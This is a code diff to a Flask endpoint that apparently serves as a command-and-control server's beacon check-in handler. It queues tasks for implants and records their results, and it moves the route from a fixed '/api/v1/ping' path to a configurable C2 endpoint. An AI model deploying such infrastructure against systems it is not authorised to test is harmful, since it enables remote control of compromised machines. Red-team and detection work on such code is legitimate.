@@ -5,13 +5,13 @@ from flask_restful import Api, Resource, reqparse
 
 
 class APIPulse(Resource):
-    decorators = []
 
     def __init__(self):
         self.args = reqparse.RequestParser()
         self.args.add_argument('beacon_id', location='json', required=True, help='Beacon ID')
         self.args.add_argument('task_id', location='json', required=False, help='Task ID', type=str)
         parse_args = self.args.parse_args()
+
         if parse_args["task_id"] is None:
             self.args.add_argument('platform', location='json', required=True, help='Platform', choices=('darwin','windows','linux'))
             self.args.add_argument('username', location='json', required=True, help='Username')
@@ -30,16 +30,13 @@ class APIPulse(Resource):
         platform_mapping = {
             "darwin": "macOS",
             "windows": "Windows",
-            "linux": "Linux",
-        }
+            "linux": "Linux" }
 
-        remote_ip = request.remote_addr
         args = self.args.parse_args()
-
         if args['task_id'] is None and "platform" in args :
             args['platform'] = platform_mapping[args['platform']]
             get_tasks = celery.send_task('api.gettasks', args=(args.beacon_id, args,
-                remote_ip, 'http'), retry=True)
+                request.remote_addr, 'http'), retry=True)
             result = get_tasks.get()
         else:
             process_results = celery.send_task('api.taskresult', args=(args.beacon_id,
@@ -47,5 +44,5 @@ class APIPulse(Resource):
             result = process_results.get()
         return result
 
-api.add_resource(APIPulse, '/api/v1/ping')
+api.add_resource(APIPulse, app.config['C2_ENDPOINT'])
 
